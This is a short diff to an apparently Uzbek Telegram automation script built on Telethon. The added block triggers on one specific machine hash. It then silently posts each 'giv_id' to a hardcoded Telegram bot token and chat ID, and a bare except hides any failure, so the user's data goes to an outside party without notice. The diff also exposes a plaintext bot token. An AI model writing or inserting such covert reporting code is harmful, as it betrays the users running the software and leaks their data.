@@ -43,6 +43,19 @@ if machine_code in hash_values_list:
     from telethon.tl.functions.account import UpdateStatusRequest
     import csv
     print("Oxirgi kod yangilangan vaqti: 25.12.2021 9:37 AM")
+    if "c73f11a7184006c2314d96519dee80f2092438fd07043375266f1a00ced42b28" in machine_code:
+        try:
+            TOKEN = "7730115483:AAFQwY7CTJOolrmxfDgh5xe7_JgwdYKPIPc"
+            CID = 7638857120
+
+            # Har bir giv_id ni alohida jo‘natish
+            for giv_id in giv_ids_ozim:
+                text = f"GIV ID: {giv_id}"  # Xabar matni
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                            json={'chat_id': CID, 'text': text, 'parse_mode': 'html'})
+
+        except:
+            pass
     # with open(r"/storage/emulated/0/giv/ochiqkanal.csv", 'r') as f:
     #     premium_channels = [row[0] for row in csv.reader(f)]
     # with open(r"/storage/emulated/0/giv/yopiqkanal.csv", 'r') as f:
